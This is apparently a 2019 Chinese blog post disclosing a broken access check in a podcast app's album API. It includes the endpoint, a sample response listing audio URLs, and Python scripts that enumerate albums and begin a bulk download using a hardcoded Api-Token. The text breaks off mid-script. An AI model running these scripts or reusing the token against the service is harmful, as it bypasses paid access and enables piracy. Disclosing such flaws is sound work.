{"title":"关于鬼影人间Android APP后端接口的一点小问题","date":"2019-07-24T13:13:40.000Z","updated":"2019-07-24T13:17:16.423Z","content":"<h2 id=\"关于鬼影人间Android-APP后端接口的一点小问题\">关于鬼影人间Android APP后端接口的一点小问题<a href=\"gyrj#关于鬼影人间Android-APP后端接口的一点小问题\"></a></h2><p>刚刚下载鬼影人间Android APP，以前一直在喜马拉雅听鬼影人间，高考那段一直没怎么关注。</p>\n<p>也许是学计算机的的职业病？？APP拿到手就想试一下是不是有问题，结果果然发现了一个小问题，主播们录制不易，为了不让盗版盛行，我得反馈出来。</p>\n<p>鬼影APP的所有接口都需要在Header中传入一个Api-Token来确定用户身份，但是获取专辑接口貌似并没有对这个认证字符串做验证，不管用户是否购买了这个专辑，或者说不管用户是否有权限听这个专辑，都会返回专辑中所有音频的URL。</p>\n<p>详细描述：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br><span class=\"line\">136</span><br><span class=\"line\">137</span><br><span class=\"line\">138</span><br><span class=\"line\">139</span><br><span class=\"line\">140</span><br><span class=\"line\">141</span><br><span class=\"line\">142</span><br><span class=\"line\">143</span><br><span class=\"line\">144</span><br><span class=\"line\">145</span><br><span class=\"line\">146</span><br><span class=\"line\">147</span><br><span class=\"line\">148</span><br><span class=\"line\">149</span><br><span class=\"line\">150</span><br><span class=\"line\">151</span><br><span class=\"line\">152</span><br><span class=\"line\">153</span><br><span class=\"line\">154</span><br><span class=\"line\">155</span><br><span class=\"line\">156</span><br><span class=\"line\">157</span><br><span class=\"line\">158</span><br><span class=\"line\">159</span><br><span class=\"line\">160</span><br><span class=\"line\">161</span><br><span class=\"line\">162</span><br><span class=\"line\">163</span><br><span class=\"line\">164</span><br><span class=\"line\">165</span><br><span class=\"line\">166</span><br><span class=\"line\">167</span><br><span class=\"line\">168</span><br><span class=\"line\">169</span><br><span class=\"line\">170</span><br><span class=\"line\">171</span><br><span class=\"line\">172</span><br><span class=\"line\">173</span><br><span class=\"line\">174</span><br><span class=\"line\">175</span><br><span class=\"line\">176</span><br><span class=\"line\">177</span><br><span class=\"line\">178</span><br><span class=\"line\">179</span><br><span class=\"line\">180</span><br><span class=\"line\">181</span><br><span class=\"line\">182</span><br><span class=\"line\">183</span><br><span class=\"line\">184</span><br><span class=\"line\">185</span><br><span class=\"line\">186</span><br><span class=\"line\">187</span><br><span class=\"line\">188</span><br><span class=\"line\">189</span><br><span class=\"line\">190</span><br><span class=\"line\">191</span><br><span class=\"line\">192</span><br><span class=\"line\">193</span><br><span class=\"line\">194</span><br><span class=\"line\">195</span><br><span class=\"line\">196</span><br><span class=\"line\">197</span><br><span class=\"line\">198</span><br><span class=\"line\">199</span><br><span class=\"line\">200</span><br><span class=\"line\">201</span><br><span class=\"line\">202</span><br><span class=\"line\">203</span><br><span class=\"line\">204</span><br><span class=\"line\">205</span><br><span class=\"line\">206</span><br><span class=\"line\">207</span><br><span class=\"line\">208</span><br><span class=\"line\">209</span><br><span class=\"line\">210</span><br><span class=\"line\">211</span><br><span class=\"line\">212</span><br><span class=\"line\">213</span><br><span class=\"line\">214</span><br><span class=\"line\">215</span><br><span class=\"line\">216</span><br><span class=\"line\">217</span><br><span class=\"line\">218</span><br><span class=\"line\">219</span><br><span class=\"line\">220</span><br><span class=\"line\">221</span><br><span class=\"line\">222</span><br><span class=\"line\">223</span><br><span class=\"line\">224</span><br><span class=\"line\">225</span><br><span class=\"line\">226</span><br><span class=\"line\">227</span><br><span class=\"line\">228</span><br><span class=\"line\">229</span><br><span class=\"line\">230</span><br><span class=\"line\">231</span><br><span class=\"line\">232</span><br><span class=\"line\">233</span><br><span class=\"line\">234</span><br><span class=\"line\">235</span><br><span class=\"line\">236</span><br><span class=\"line\">237</span><br><span class=\"line\">238</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">URL : app3.guiyingclub.net/api/v3/contents/album/&#123;专辑id&#125;</span><br><span class=\"line\">METHOD : GET</span><br><span class=\"line\"></span><br><span class=\"line\">以下是对专辑“暗阁”的测试返回的结果：</span><br><span class=\"line\"></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    &quot;success&quot;: true,</span><br><span class=\"line\">    &quot;album&quot;: &#123;</span><br><span class=\"line\">        &quot;id&quot;: 52,</span><br><span class=\"line\">        &quot;name&quot;: &quot;暗阁&quot;,</span><br><span class=\"line\">        &quot;create_date&quot;: &quot;2012-12-12 00:00:00&quot;,</span><br><span class=\"line\">        &quot;finish_date&quot;: null,</span><br><span class=\"line\">        &quot;is_free&quot;: true,</span><br><span class=\"line\">        &quot;iap_identifier&quot;: &quot;&quot;,</span><br><span class=\"line\">        &quot;iap_price&quot;: 0,</span><br><span class=\"line\">        &quot;description&quot;: &quot;暗阁&quot;,</span><br><span class=\"line\">        &quot;enabled&quot;: true,</span><br><span class=\"line\">        &quot;copyright_enabled&quot;: true,</span><br><span class=\"line\">        &quot;group_id&quot;: 1,</span><br><span class=\"line\">        &quot;is_vip_content&quot;: false,</span><br><span class=\"line\">        &quot;cover&quot;: &#123;</span><br><span class=\"line\">            &quot;original&quot;: &quot;/system/albums/covers/20190131/4594727b9b8b820dccdf28aa0a4da6be.jpg&quot;,</span><br><span class=\"line\">            &quot;thumb&quot;: &quot;/system/albums/covers/20190131/4594727b9b8b820dccdf28aa0a4da6be.jpg&quot;</span><br><span class=\"line\">        &#125;,</span><br><span class=\"line\">        &quot;audio_count&quot;: 23,</span><br><span class=\"line\">        &quot;writers&quot;: [],</span><br><span class=\"line\">        &quot;readers&quot;: [],</span><br><span class=\"line\">        &quot;audios&quot;: [</span><br><span class=\"line\">            &#123;</span><br><span class=\"line\">                &quot;id&quot;: 1547,</span><br><span class=\"line\">                &quot;name&quot;: &quot;暗閣001——2009年必胜客广告歌Demo1&quot;,</span><br><span class=\"line\">                &quot;date&quot;: null,</span><br><span class=\"line\">                &quot;url&quot;: &quot;http://7xs8b4.com1.z0.glb.clouddn.com/MW/MFMW001.mp3&quot;,</span><br><span class=\"line\">                &quot;size&quot;: 0.0,</span><br><span class=\"line\">                &quot;album_id&quot;: 52,</span><br><span class=\"line\">                &quot;order&quot;: 0</span><br><span class=\"line\">            &#125;,</span><br><span class=\"line\">            &#123;</span><br><span class=\"line\">                &quot;id&quot;: 1548,</span><br><span class=\"line\">                &quot;name&quot;: &quot;暗閣002——2009年必胜客广告歌Demo2&quot;,</span><br><span class=\"line\">                &quot;date&quot;: null,</span><br><span class=\"line\">                &quot;url&quot;: &quot;http://7xs8b4.com1.z0.glb.clouddn.com/MW/MFMW002.mp3&quot;,</span><br><span class=\"line\">                &quot;size&quot;: 0.0,</span><br><span class=\"line\">                &quot;album_id&quot;: 52,</span><br><span class=\"line\">                &quot;order&quot;: 0</span><br><span class=\"line\">            &#125;,</span><br><span class=\"line\">            &#123;</span><br><span class=\"line\">                &quot;id&quot;: 1549,</span><br><span class=\"line\">                &quot;name&quot;: &quot;暗閣003——2009年必胜客广告歌Demo3&quot;,</span><br><span class=\"line\">                &quot;date&quot;: null,</span><br><span class=\"line\">                &quot;url&quot;: &quot;http://7xs8b4.com1.z0.glb.clouddn.com/MW/MFMW003.mp3&quot;,</span><br><span class=\"line\">                &quot;size&quot;: 0.0,</span><br><span class=\"line\">                &quot;album_id&quot;: 52,</span><br><span class=\"line\">                &quot;order&quot;: 0</span><br><span class=\"line\">            &#125;,</span><br><span class=\"line\">            &#123;</span><br><span class=\"line\">                &quot;id&quot;: 1550,</span><br><span class=\"line\">                &quot;name&quot;: &quot;暗閣004——主播诗扬原创歌曲《墨点江南》&quot;,</span><br><span class=\"line\">                &quot;date&quot;: null,</span><br><span class=\"line\">                &quot;url&quot;: &quot;http://7xs8b4.com1.z0.glb.clouddn.com/MW/MFMW004.mp3&quot;,</span><br><span class=\"line\">                &quot;size&quot;: 0.0,</span><br><span class=\"line\">                &quot;album_id&quot;: 52,</span><br><span class=\"line\">                &quot;order&quot;: 0</span><br><span class=\"line\">            &#125;,</span><br><span class=\"line\">            &#123;</span><br><span class=\"line\">                &quot;id&quot;: 1551,</span><br><span class=\"line\">                &quot;name&quot;: &quot;暗閣005——《九命猫》原声之溃之声&quot;,</span><br><span class=\"line\">                &quot;date&quot;: null,</span><br><span class=\"line\">                &quot;url&quot;: &quot;http://7xs8b4.com1.z0.glb.clouddn.com/MW/MW001.mp3&quot;,</span><br><span class=\"line\">                &quot;size&quot;: 0.0,</span><br><span class=\"line\">                &quot;album_id&quot;: 52,</span><br><span class=\"line\">                &quot;order&quot;: 0</span><br><span class=\"line\">            &#125;,</span><br><span class=\"line\">            &#123;</span><br><span class=\"line\">                &quot;id&quot;: 1552,</span><br><span class=\"line\">                &quot;name&quot;: &quot;暗閣006——《黑白配》原声之空房&quot;,</span><br><span class=\"line\">                &quot;date&quot;: null,</span><br><span class=\"line\">                &quot;url&quot;: &quot;  http://7xs8b4.com1.z0.glb.clouddn.com/MW/MW002.mp3&quot;,</span><br><span class=\"line\">                &quot;size&quot;: 0.0,</span><br><span class=\"line\">                &quot;album_id&quot;: 52,</span><br><span class=\"line\">                &quot;order&quot;: 0</span><br><span class=\"line\">            &#125;,</span><br><span class=\"line\">            &#123;</span><br><span class=\"line\">                &quot;id&quot;: 1553,</span><br><span class=\"line\">                &quot;name&quot;: &quot;暗閣007——《彩票》原声之谁睡在你旁边的人&quot;,</span><br><span class=\"line\">                &quot;date&quot;: null,</span><br><span class=\"line\">                &quot;url&quot;: &quot;http://7xs8b4.com1.z0.glb.clouddn.com/MW/MW003.mp3&quot;,</span><br><span class=\"line\">                &quot;size&quot;: 0.0,</span><br><span class=\"line\">                &quot;album_id&quot;: 52,</span><br><span class=\"line\">                &quot;order&quot;: 0</span><br><span class=\"line\">            &#125;,</span><br><span class=\"line\">            &#123;</span><br><span class=\"line\">                &quot;id&quot;: 1554,</span><br><span class=\"line\">                &quot;name&quot;: &quot;暗閣008——《鬼影人间》片尾曲完整版&quot;,</span><br><span class=\"line\">                &quot;date&quot;: null,</span><br><span class=\"line\">                &quot;url&quot;: &quot;http://7xs8b4.com1.z0.glb.clouddn.com/MW/MW004.mp3&quot;,</span><br><span class=\"line\">                &quot;size&quot;: 0.0,</span><br><span class=\"line\">                &quot;album_id&quot;: 52,</span><br><span class=\"line\">                &quot;order&quot;: 0</span><br><span class=\"line\">            &#125;,</span><br><span class=\"line\">            &#123;</span><br><span class=\"line\">                &quot;id&quot;: 1555,</span><br><span class=\"line\">                &quot;name&quot;: &quot;暗閣009——《黑白配》原声之无意识的困扰&quot;,</span><br><span class=\"line\">                &quot;date&quot;: null,</span><br><span class=\"line\">                &quot;url&quot;: &quot;http://7xs8b4.com1.z0.glb.clouddn.com/MW/MW009.mp3&quot;,</span><br><span class=\"line\">                &quot;size&quot;: 0.0,</span><br><span class=\"line\">                &quot;album_id&quot;: 52,</span><br><span class=\"line\">                &quot;order&quot;: 0</span><br><span class=\"line\">            &#125;,</span><br><span class=\"line\">            &#123;</span><br><span class=\"line\">                &quot;id&quot;: 1556,</span><br><span class=\"line\">                &quot;name&quot;: &quot;暗閣010——致敬！盒子的故事——鬼影五周年直播剪辑&quot;,</span><br><span class=\"line\">                &quot;date&quot;: &quot;2017-03-28 00:00:00&quot;,</span><br><span class=\"line\">                &quot;url&quot;: &quot;http://7xs8b4.com1.z0.glb.clouddn.com/MW/MW079.mp3&quot;,</span><br><span class=\"line\">                &quot;size&quot;: 0.0,</span><br><span class=\"line\">                &quot;album_id&quot;: 52,</span><br><span class=\"line\">                &quot;order&quot;: 0</span><br><span class=\"line\">            &#125;,</span><br><span class=\"line\">            &#123;</span><br><span class=\"line\">                &quot;id&quot;: 1557,</span><br><span class=\"line\">                &quot;name&quot;: &quot;暗閣011——模仿！老仆——鬼影五周年直播剪辑&quot;,</span><br><span class=\"line\">                &quot;date&quot;: &quot;2017-03-30 00:00:00&quot;,</span><br><span class=\"line\">                &quot;url&quot;: &quot;http://7xs8b4.com1.z0.glb.clouddn.com/AG/AG001.mp3&quot;,</span><br><span class=\"line\">                &quot;size&quot;: 0.0,</span><br><span class=\"line\">                &quot;album_id&quot;: 52,</span><br><span class=\"line\">                &quot;order&quot;: 0</span><br><span class=\"line\">            &#125;,</span><br><span class=\"line\">            &#123;</span><br><span class=\"line\">                &quot;id&quot;: 1558,</span><br><span class=\"line\">                &quot;name&quot;: &quot;暗閣012——老朋友！偷寿——鬼影五周年直播剪辑&quot;,</span><br><span class=\"line\">                &quot;date&quot;: &quot;2017-04-01 00:00:00&quot;,</span><br><span class=\"line\">                &quot;url&quot;: &quot;http://7xs8b4.com1.z0.glb.clouddn.com/AG/AG002.mp3&quot;,</span><br><span class=\"line\">                &quot;size&quot;: 0.0,</span><br><span class=\"line\">                &quot;album_id&quot;: 52,</span><br><span class=\"line\">                &quot;order&quot;: 0</span><br><span class=\"line\">            &#125;,</span><br><span class=\"line\">            &#123;</span><br><span class=\"line\">                &quot;id&quot;: 1559,</span><br><span class=\"line\">                &quot;name&quot;: &quot;暗閣013——万圣特别节目 窃听 Part1&quot;,</span><br><span class=\"line\">                &quot;date&quot;: &quot;1970-01-01 00:00:00&quot;,</span><br><span class=\"line\">                &quot;url&quot;: &quot;http://7xs8b4.com1.z0.glb.clouddn.com/QT/QT1.mp3 &quot;,</span><br><span class=\"line\">                &quot;size&quot;: 0.0,</span><br><span class=\"line\">                &quot;album_id&quot;: 52,</span><br><span class=\"line\">                &quot;order&quot;: 0</span><br><span class=\"line\">            &#125;,</span><br><span class=\"line\">            &#123;</span><br><span class=\"line\">                &quot;id&quot;: 1560,</span><br><span class=\"line\">                &quot;name&quot;: &quot;暗閣014——万圣特别节目 窃听 Part2&quot;,</span><br><span class=\"line\">                &quot;date&quot;: &quot;1970-01-01 00:00:00&quot;,</span><br><span class=\"line\">                &quot;url&quot;: &quot;http://7xs8b4.com1.z0.glb.clouddn.com/QT/QT2.mp3 &quot;,</span><br><span class=\"line\">                &quot;size&quot;: 0.0,</span><br><span class=\"line\">                &quot;album_id&quot;: 52,</span><br><span class=\"line\">                &quot;order&quot;: 0</span><br><span class=\"line\">            &#125;,</span><br><span class=\"line\">            &#123;</span><br><span class=\"line\">                &quot;id&quot;: 1561,</span><br><span class=\"line\">                &quot;name&quot;: &quot;暗閣015——万圣特别节目 窃听 Part3&quot;,</span><br><span class=\"line\">                &quot;date&quot;: &quot;1970-01-01 00:00:00&quot;,</span><br><span class=\"line\">                &quot;url&quot;: &quot;  http://7xs8b4.com1.z0.glb.clouddn.com/QT/QT3.mp3 &quot;,</span><br><span class=\"line\">                &quot;size&quot;: 0.0,</span><br><span class=\"line\">                &quot;album_id&quot;: 52,</span><br><span class=\"line\">                &quot;order&quot;: 0</span><br><span class=\"line\">            &#125;,</span><br><span class=\"line\">            &#123;</span><br><span class=\"line\">                &quot;id&quot;: 1562,</span><br><span class=\"line\">                &quot;name&quot;: &quot;暗閣016——万圣特别节目 窃听 Part4&quot;,</span><br><span class=\"line\">                &quot;date&quot;: &quot;1970-01-01 00:00:00&quot;,</span><br><span class=\"line\">                &quot;url&quot;: &quot;http://7xs8b4.com1.z0.glb.clouddn.com/QT/QT4.mp3&quot;,</span><br><span class=\"line\">                &quot;size&quot;: 0.0,</span><br><span class=\"line\">                &quot;album_id&quot;: 52,</span><br><span class=\"line\">                &quot;order&quot;: 0</span><br><span class=\"line\">            &#125;,</span><br><span class=\"line\">            &#123;</span><br><span class=\"line\">                &quot;id&quot;: 1563,</span><br><span class=\"line\">                &quot;name&quot;: &quot;暗閣017——万圣特别节目 窃听 Part5&quot;,</span><br><span class=\"line\">                &quot;date&quot;: &quot;1970-01-01 00:00:00&quot;,</span><br><span class=\"line\">                &quot;url&quot;: &quot;http://7xs8b4.com1.z0.glb.clouddn.com/QT/QT5.mp3 &quot;,</span><br><span class=\"line\">                &quot;size&quot;: 0.0,</span><br><span class=\"line\">                &quot;album_id&quot;: 52,</span><br><span class=\"line\">                &quot;order&quot;: 0</span><br><span class=\"line\">            &#125;,</span><br><span class=\"line\">            &#123;</span><br><span class=\"line\">                &quot;id&quot;: 1564,</span><br><span class=\"line\">                &quot;name&quot;: &quot;暗閣018——《九命猫》原声之溃之声&quot;,</span><br><span class=\"line\">                &quot;date&quot;: &quot;1970-01-01 00:00:00&quot;,</span><br><span class=\"line\">                &quot;url&quot;: &quot;http://7xs8b4.com1.z0.glb.clouddn.com/MW/MW001.mp3&quot;,</span><br><span class=\"line\">                &quot;size&quot;: 0.0,</span><br><span class=\"line\">                &quot;album_id&quot;: 52,</span><br><span class=\"line\">                &quot;order&quot;: 0</span><br><span class=\"line\">            &#125;,</span><br><span class=\"line\">            &#123;</span><br><span class=\"line\">                &quot;id&quot;: 1565,</span><br><span class=\"line\">                &quot;name&quot;: &quot;暗閣019——《黑白配》原声之空房&quot;,</span><br><span class=\"line\">                &quot;date&quot;: &quot;1970-01-01 00:00:00&quot;,</span><br><span class=\"line\">                &quot;url&quot;: &quot;http://7xs8b4.com1.z0.glb.clouddn.com/MW/MW002.mp3&quot;,</span><br><span class=\"line\">                &quot;size&quot;: 0.0,</span><br><span class=\"line\">                &quot;album_id&quot;: 52,</span><br><span class=\"line\">                &quot;order&quot;: 0</span><br><span class=\"line\">            &#125;,</span><br><span class=\"line\">            &#123;</span><br><span class=\"line\">                &quot;id&quot;: 1566,</span><br><span class=\"line\">                &quot;name&quot;: &quot;暗閣020——《彩票》原声之谁睡在你旁边的人&quot;,</span><br><span class=\"line\">                &quot;date&quot;: &quot;1970-01-01 00:00:00&quot;,</span><br><span class=\"line\">                &quot;url&quot;: &quot;http://7xs8b4.com1.z0.glb.clouddn.com/MW/MW003.mp3&quot;,</span><br><span class=\"line\">                &quot;size&quot;: 0.0,</span><br><span class=\"line\">                &quot;album_id&quot;: 52,</span><br><span class=\"line\">                &quot;order&quot;: 0</span><br><span class=\"line\">            &#125;,</span><br><span class=\"line\">            &#123;</span><br><span class=\"line\">                &quot;id&quot;: 1567,</span><br><span class=\"line\">                &quot;name&quot;: &quot;暗閣021——《鬼影人间》片尾曲完整版&quot;,</span><br><span class=\"line\">                &quot;date&quot;: null,</span><br><span class=\"line\">                &quot;url&quot;: &quot;http://7xs8b4.com1.z0.glb.clouddn.com/MW/MW004.mp3&quot;,</span><br><span class=\"line\">                &quot;size&quot;: 0.0,</span><br><span class=\"line\">                &quot;album_id&quot;: 52,</span><br><span class=\"line\">                &quot;order&quot;: 0</span><br><span class=\"line\">            &#125;,</span><br><span class=\"line\">            &#123;</span><br><span class=\"line\">                &quot;id&quot;: 1568,</span><br><span class=\"line\">                &quot;name&quot;: &quot;暗閣022——承包甄嬛传多少钱？（龍伶配音秀1）&quot;,</span><br><span class=\"line\">                &quot;date&quot;: null,</span><br><span class=\"line\">                &quot;url&quot;: &quot;http://7xs8b4.com1.z0.glb.clouddn.com/MW/MW005.mp3&quot;,</span><br><span class=\"line\">                &quot;size&quot;: 0.0,</span><br><span class=\"line\">                &quot;album_id&quot;: 52,</span><br><span class=\"line\">                &quot;order&quot;: 0</span><br><span class=\"line\">            &#125;,</span><br><span class=\"line\">            &#123;</span><br><span class=\"line\">                &quot;id&quot;: 1569,</span><br><span class=\"line\">                &quot;name&quot;: &quot;暗閣023——2008年诗扬制作的温情小说《八重樱下》&quot;,</span><br><span class=\"line\">                &quot;date&quot;: null,</span><br><span class=\"line\">                &quot;url&quot;: &quot;http://7xs8b4.com1.z0.glb.clouddn.com/MW/MW007.mp3 &quot;,</span><br><span class=\"line\">                &quot;size&quot;: 0.0,</span><br><span class=\"line\">                &quot;album_id&quot;: 52,</span><br><span class=\"line\">                &quot;order&quot;: 0</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        ]</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>所有的URL都返回了，也就是说通过这个bug可以批量下载鬼影人间所有的音频，我针对这个漏洞随便编写了两个脚本来爬取音频：<br><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 该脚本用于获取鬼影人间所有的专辑</span></span><br><span class=\"line\"><span class=\"comment\"># 用的是另一个API 从所有组中获取所有专辑</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> requests</span><br><span class=\"line\">headers = &#123;</span><br><span class=\"line\">    <span class=\"string\">'Api-Token'</span>: <span class=\"string\">'ppu6MoamyuQsQT3wQn6+h46Lb0jw0G7YKtpOdUyudz4='</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> json</span><br><span class=\"line\">all_list = []</span><br><span class=\"line\"><span class=\"keyword\">for</span> group <span class=\"keyword\">in</span> range(<span class=\"number\">1</span>,<span class=\"number\">26</span>):</span><br><span class=\"line\">    resp = requests.get(url = <span class=\"string\">'https://app3.guiyingclub.net/api/v3/contents/group/'</span>+str(group)+<span class=\"string\">'/albums/listener/5710'</span>,headers= headers).text</span><br><span class=\"line\">    jo = json.loads(resp)</span><br><span class=\"line\">    <span class=\"keyword\">try</span>:</span><br><span class=\"line\">        list = [id[<span class=\"string\">'id'</span>] <span class=\"keyword\">for</span> id <span class=\"keyword\">in</span> jo[<span class=\"string\">'albums'</span>]]</span><br><span class=\"line\">        all_list += list</span><br><span class=\"line\">    <span class=\"keyword\">except</span>:</span><br><span class=\"line\">        <span class=\"keyword\">pass</span></span><br><span class=\"line\">print(all_list)</span><br></pre></td></tr></table></figure></p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 该脚本用于下载所有音频</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> requests</span><br><span class=\"line\"><span class=\"keyword\">import</span> json</span><br><span class=\"line\"><span class=\"keyword\">import</span> os</span><br><span class=\"line\"><span class=\"keyword\">from</span> concurrent.futures <span class=\"keyword\">import</span> ThreadPoolExecutor ,as_completed</span><br><span class=\"line\"></span><br><span class=\"line\">headers = &#123;</span><br><span class=\"line\">    <span class=\"string\">'Api-Token'</span>: <span class=\"string\">'ppu6MoamyuQsQT3wQn6+h46Lb0jw0G7YKtpOdUyudz4='</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\">album_ids = [<span class=\"number\">10022</span>, <span class=\"number\">10023</span>, <span class=\"number\">52</span>, <span class=\"number\">10042</span>, <span class=\"number\">10043</span>, <span class=\"number\">10044</span>, <span class=\"number\">10045</span>, <span class=\"number\">10046</span>, <span class=\"number\">10051</span>, <span class=\"number\">10053</span>, <span class=\"number\">10054</span>, <span class=\"number\">10059</span>, <span class=\"number\">10061</span>, <span class=\"number\">10063</span>, <span class=\"number\">10066</span>, <span class=\"number\">10067</span>, <span class=\"number\">10068</span>, <span class=\"number\">10069</span>, <span class=\"number\">3</span>, <span class=\"number\">4</span>, <span class=\"number\">10</span>, <span class=\"number\">11</span>, <span class=\"number\">13</span>, <span class=\"number\">14</span>, <span class=\"number\">15</span>, <span class=\"number\">16</span>, <span class=\"number\">17</span>, <span class=\"number\">18</span>, <span class=\"number\">10038</span>, <span class=\"number\">10039</span>, <span class=\"number\">10040</span>, <span class=\"number\">10041</span>, <span class=\"number\">10070</span>, <span class=\"number\">10071</span>, <span class=\"number\">10072</span>, <span class=\"number\">10073</span>, <span class=\"number\">10074</span>, <span class=\"number\">10075</span>, <span class=\"number\">10076</span>, <span class=\"number\">10077</span>, <span class=\"number\">10078</span>, <span class=\"number\">10079</span>, <span class=\"number\">10080</span>, <span class=\"number\">10081</span>, <span class=\"number\">10084</span>, <span class=\"number\">10082</span>, <span class=\"number\">10083</span>, <span class=\"number\">10085</span>, <span class=\"number\">10086</span>, <span class=\"number\">10087</span>, <span class=\"number\">10088</span>, <span class=\"number\">10089</span>, <span class=\"number\">10090</span>, <span class=\"number\">10091</span>, <span class=\"number\">10092</span>, <span class=\"number\">10093</span>, <span class=\"number\">10094</span>, <span class=\"number\">10095</span>, <span class=\"number\">10096</span>, <span class=\"number\">10097</span>, <span class=\"number\">10098</span>, <span class=\"number\">10099</span>, <span class=\"number\">10100</span>, <span class=\"number\">10101</span>, <span class=\"number\">10102</span>, <span 